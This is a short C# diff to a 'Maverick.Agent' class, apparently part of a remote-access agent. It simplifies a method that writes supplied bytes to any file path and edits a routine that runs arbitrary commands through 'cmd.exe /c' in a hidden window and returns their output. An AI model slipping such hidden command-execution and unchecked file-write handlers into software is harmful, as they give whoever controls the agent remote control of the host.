@@ -33,13 +33,11 @@ namespace Maverick.Agent
         }
 
 
-        public static bool PerformWriteFile(string name, FileUploadModel file)
+        public static bool PerformWriteFile(string name, byte[] data)
         {
             try
             {
-                if (file == null || file.FileData == null) return false;
-                string filename = string.IsNullOrEmpty(name) ? file.FileName : name;
-                File.WriteAllBytes(filename, file.FileData);
+                File.WriteAllBytes(name, data);
                 return true;
             }
             catch (Exception)
@@ -56,13 +54,10 @@ namespace Maverick.Agent
                 process.StartInfo.FileName = "cmd.exe";
                 process.StartInfo.Arguments = "/c " + command;
                 process.StartInfo.RedirectStandardOutput = true;
-                process.StartInfo.RedirectStandardError = true;
                 process.StartInfo.UseShellExecute = false;
                 process.StartInfo.CreateNoWindow = true;
                 process.Start();
                 string output = process.StandardOutput.ReadToEnd();
-                if (string.IsNullOrEmpty(output))
-                    output = process.StandardError.ReadToEnd();
                 process.WaitForExit();
                 return Encoding.UTF8.GetBytes(output);
             }
